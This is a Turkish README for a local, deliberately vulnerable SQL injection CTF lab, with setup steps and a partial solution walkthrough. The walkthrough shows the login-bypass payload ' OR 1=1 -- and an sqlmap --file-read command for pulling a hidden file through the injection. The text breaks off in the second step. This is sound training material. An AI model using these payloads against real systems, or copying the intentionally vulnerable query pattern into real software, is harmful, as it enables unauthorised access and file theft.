# SQL Injection Zorlu CTF Labı

![CTF](https://img.shields.io/badge/CTF-Lab-blue)

---

## İçindekiler

- [Proje Hakkında](#proje-hakkında)
- [Özellikler](#özellikler)
- [Kurulum](#kurulum)
- [Nasıl Çözülür?](#nasıl-çözülür)
  - [1. Giriş Formunu Bypass Etme (SQL Injection)](#1-giriş-formunu-bypass-etme-sql-injection)
  - [2. Gizli Flag Dosyasını Bulma](#2-gizli-flag-dosyasını-bulma)
  - [3. Flag’i Decode Etme](#3-flag’i-decode-etme)
- [Dosya ve Klasör Yapısı](#dosya-ve-klasör-yapısı)
- [Güvenlik Notları](#güvenlik-notları)
- [İleri Seviye Öneriler](#ileri-seviye-öneriler)
- [Katkıda Bulunanlar](#katkıda-bulunanlar)
- [Lisans](#lisans)

---

## Proje Hakkında

Bu proje, siber güvenlik alanında kendini geliştirmek isteyenler için hazırlanmış, **zor seviyede SQL Injection açığı içeren** bir CTF (Capture The Flag) laboratuvarıdır. Amacı, gerçekçi ve dayanıklı bir ortamda SQL Injection tekniklerini kullanarak:

- Giriş kontrol mekanizmasını bypass etmek,
- Sistem dosyalarında gizlenmiş flag’i keşfetmek,
- Flag içeriğini base64 ve hex formatlarından çözümleyerek anlamak,

gibi kritik becerileri öğretmektir.

---

## Özellikler

- **Hazırlanmış ifade (Prepared Statements) yerine kasıtlı olarak zafiyetli SQL sorguları**
- **SQL Injection ile bypass edilebilir giriş formu**
- **Flag, veritabanında değil sistemin gizli bir klasöründe `.assets/style.css` dosyasına base64 olarak gömülü**
- **Flag içeriği hex formatında saklanmış, çözüm için analiz gerektiriyor**
- **Bootstrap tabanlı estetik ve kullanıcı dostu arayüz**
- **Yanıltıcı ipuçları ve sahte log kayıtlarıyla zorluk artırılmış**

---

## Kurulum

1. **Sunucu ortamı hazırla:**

   - Apache + PHP + MySQL çalışır durumda olmalı (örneğin XAMPP, MAMP veya benzeri).

2. **Projeyi sunucuya kopyala:**

   - Proje dosyalarını `htdocs` veya `www` dizinine yerleştir.

3. **Veritabanını oluştur ve import et:**

   - PhpMyAdmin veya komut satırı ile yeni bir `ctf_zor` veritabanı oluştur.
   - `db.sql` dosyasını veritabanına import et.

4. **Web tarayıcısında projeyi aç:**

   - Örneğin: `http://localhost/index.php`

---

## Nasıl Çözülür?

### 1. Giriş Formunu Bypass Etme (SQL Injection)

- Giriş formu kasıtlı olarak SQL Injection açığı içerir.
- Kullanıcı adı ve şifre alanlarına aşağıdaki payload’ları kullanarak giriş yapabilirsiniz:

```text
Kullanıcı Adı: ' OR 1=1 --
Şifre: HerhangiBirŞey
```
- Bu, sorgunun şu şekilde çalışmasını sağlar:

```sql
SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password='HerhangiBirŞey'
```

- Bu sorgu her zaman true döner ve giriş başarılı olur.

## 2. Gizli Flag Dosyasını Bulma
Flag, veritabanında değil sistemin gizli .assets klasöründeki style.css dosyasında saklanıyor.

- Dosya içeriği içinde flag, base64 olarak gömülü.

- SQL Injection açığı kullanılarak dosya okuma yapılmalı (örneğin sqlmap ile):

```bash
sqlmap -u "http://localhost/vulnerable.php?id=1" --file-read="/var/www/html/.assets/style.css"
```
